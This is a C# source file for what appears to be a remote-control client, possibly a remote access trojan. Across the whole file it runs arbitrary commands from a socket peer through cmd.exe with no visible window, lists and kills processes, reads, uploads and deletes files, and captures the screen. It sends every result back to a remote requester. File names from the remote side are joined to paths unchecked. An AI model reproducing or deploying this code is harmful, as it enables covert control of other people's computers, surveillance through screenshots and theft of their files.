using Newtonsoft.Json;
using System.Diagnostics;
using fin_pro;
using System.Drawing.Imaging;

internal class Incoming_commands
{
    public Incoming_commands()
    {

    }
    private string Cmd_run(string cmd)
    {
        // Create a new process object
        var process = new Process
        {
            // Set the process start info
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + cmd,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            }
        };

        // Start the process
        process.Start();

        // Wait for the process to exit
        process.WaitForExit();

        // Get the output from the process
        return process.StandardOutput.ReadToEnd();
    }
    // Define a function to run a command and return its output
    public void Run_command(string cmd, string asking_client_for_out_put, Server_connactor new_socket)
    {
        string output = Cmd_run(cmd);
        // Create a JSON object to send back to the client
        var data = new
        {
            command = "Run_command_result",
            out_put = output,
            asking_ip = asking_client_for_out_put,
        };

        // Convert the JSON object to a string and return it
        string out_put = JsonConvert.SerializeObject(data);
        new_socket.send_message_no_recv(out_put);
    }
    // This method returns an array of ProcessInfo objects that contains information about all the running processes on the local machine
    private ProcessInfo[] get_my_process()
    {
        // Get an array of all the running processes on the local machine
        Process[] processes = Process.GetProcesses();

        // Create a new array of ProcessInfo objects with the same length as the processes array
        ProcessInfo[] processinfo = new ProcessInfo[processes.Length];

        // Initialize a counter to keep track of the current index of the processinfo array
        int counter = 0;

        // Loop through all the processes in the processes array
        foreach (Process process in processes)
        {
            // Create a new ProcessInfo object to store the process information
            ProcessInfo info = new ProcessInfo();

            // Set the name property of the ProcessInfo object to the process name
            info.name = process.ProcessName;

            // Set the id property of the ProcessInfo object to the process ID
            info.id = process.Id;

            // Add the ProcessInfo object to the processinfo array at the current index and increment the counter
            processinfo[counter++] = info;
        }

        // Return the processinfo array
        return processinfo;
    }
    // This method returns a JSON string that contains information about all the running processes on the local machine
    public void Get_all_process(string asking_client_for_out_put, Server_connactor new_socket, string user_name)
    {
        // Get an array of ProcessInfo objects that contains information about all the running processes on the local machine
        ProcessInfo[] processes = get_my_process();

        // Create an anonymous object with properties that represent the information that will be sent to the client
        var data = new
        {
            asking_ip = asking_client_for_out_put,
            command = "Get_all_processes_result",
            the_processes = processes,
            username= user_name
        };

        // Serialize the anonymous object to a JSON string
        string out_put = JsonConvert.SerializeObject(data);

        // Send the JSON string
        new_socket.send_message_no_recv(out_put);
    }
    // This method kills the process with the specified process ID
    private bool kill_process(int process_id)
    {
        // Get the process with the specified process ID and kill it
        try
        {
            Process.GetProcessById(process_id).Kill();
            return true;
        }
        catch
        {
            return false;
        }
    }
    public void Kill_process(string process_id, string asking_client_for_out_put, Server_connactor new_socket)
    {
        // Kill the process with the given process ID and send the response back to the server
        bool success = kill_process(int.Parse(process_id));

        var data = new
        {
            command = "Kill_process_result",
            addressed_client = asking_client_for_out_put,
            process_id = process_id,
            success = success
        };
        var dataStr = JsonConvert.SerializeObject(data);
        new_socket.send_message_no_recv(dataStr);
    }
    // Checks if a folder exists at the specified path, and creates it if it doesn't.
    public static void CheckAndCreateFolder(string path)
    {
        // Check if the folder at the specified path exists
        if (!Directory.Exists(path))
        {
            // If the folder doesn't exist, create it
            Directory.CreateDirectory(path);
        }
    }
    public void Get_all_files_name(string asking_client_for_out_put, Server_connactor new_socket, string user_name)
    {
        CheckAndCreateFolder(Config.path);
        string[] files_names = Directory.GetFiles(Config.path);

        // Create an anonymous object with properties that represent the information that will be sent to the client
        var data = new
        {
            addressed_client = asking_client_for_out_put,
            command = "Get_all_files_names_result",
            files_names = files_names,
            username = user_name
        };

        // Serialize the anonymous object to a JSON string
        string out_put = JsonConvert.SerializeObject(data);

        // Send the JSON string
        new_socket.send_message_no_recv(out_put);
    }
    public void Get_file(string asking_client_for_out_put, Server_connactor new_socket, string file_name)
    {
        CheckAndCreateFolder(Config.path);
        string filePath = Config.path + "\\" + file_name;
        byte[] buffer;
        // Open the file as a stream
        using (FileStream fileStream = new FileStream(filePath, FileMode.Open))
        {
            // Create a buffer to hold the binary data
            buffer = new byte[fileStream.Length];

            // Read the binary data into the buffer
            fileStream.Read(buffer, 0, buffer.Length);
        }
        var data = new
        {
            addressed_client = asking_client_for_out_put,
            command = "Get_file_result",
            file_data = buffer,
            file_name = file_name
        };
        // Serialize the anonymous object to a JSON string
        string out_put = JsonConvert.SerializeObject(data);

        // Send the JSON string
        new_socket.send_message_no_recv(out_put);
    }
    private bool Create_file(string file_name, string file_content)
    {
        try
        {
            CheckAndCreateFolder(Config.path);
            string newFilePath = Config.path + "\\" + file_name;
            // Create the new file and write the contents of the old file to it
            File.WriteAllText(newFilePath, file_content);
            return true;
        }
        catch (Exception ex)
        { 
            return false;
        }
    }
    public void Upload_file(string asking_client_for_out_put, Server_connactor new_socket, string file_name, string file_data)
    {
        bool success = Create_file(file_name, file_data);
        var data = new
        {
            addressed_client = asking_client_for_out_put,
            command = "Upload_file_result",
            success = success
        };
        // Serialize the anonymous object to a JSON string
        string out_put = JsonConvert.SerializeObject(data);

        // Send the JSON string
        new_socket.send_message_no_recv(out_put);
    }
    // This method deletes a specified file and returns true if the deletion was successful, false otherwise
    private bool Delete_file_respond(string file_name)
    {
        try
        {
            CheckAndCreateFolder(Config.path);
            string filePath = Config.path + "\\" + file_name;  

            if (File.Exists(filePath))
            {
                File.Delete(filePath);
                Console.WriteLine("File deleted successfully!");
            }
            else
            {
                Console.WriteLine("File does not exist.");
            }
            return true;
        }
        catch (Exception ex)
        {
            return false;
        }
    }
    // This method handles the "Delete_file" command from the client by deleting the specified file and sending a result message back to the client
    public void Delete_file(string asking_client_for_out_put, Server_connactor new_socket, string file_name)
    {
        bool success = Delete_file_respond(file_name);
        var data = new
        {
            addressed_client = asking_client_for_out_put,
            command = "Delete_file_result",
            success = success
        };
        // Serialize the anonymous object to a JSON string
        string out_put = JsonConvert.SerializeObject(data);

        // Send the JSON string
        new_socket.send_message_no_recv(out_put);
    }
    private string Screenshot()
    {
        try
        {
            // Create a bitmap to hold the screenshot
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            // Create a graphics object to draw the screenshot onto the bitmap
            Graphics graphics = Graphics.FromImage(screenshot);

            // Copy the screen contents into the bitmap
            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            // Convert the bitmap to a byte array
            byte[] imageData;
            using (MemoryStream ms = new MemoryStream())
            {
                screenshot.Save(ms, ImageFormat.Png);
                imageData = ms.ToArray();
            }

            // Convert the byte array to a base64-encoded string
            string imageString = Convert.ToBase64String(imageData);
            return imageString;
        }
        catch (Exception ex)
        {
            return null;
        }
    }
    public void Get_screenshot(string asking_client_for_out_put, Server_connactor new_socket)
    {
        string screenshot = Screenshot();
        var data = new
        {
            addressed_client = asking_client_for_out_put,
            command = "Get_screenshot_result",
            screenshot_data = screenshot
        };
        // Serialize the anonymous object to a JSON string
        string out_put = JsonConvert.SerializeObject(data);

        // Send the JSON string
        new_socket.send_message_no_recv(out_put);
    }
}
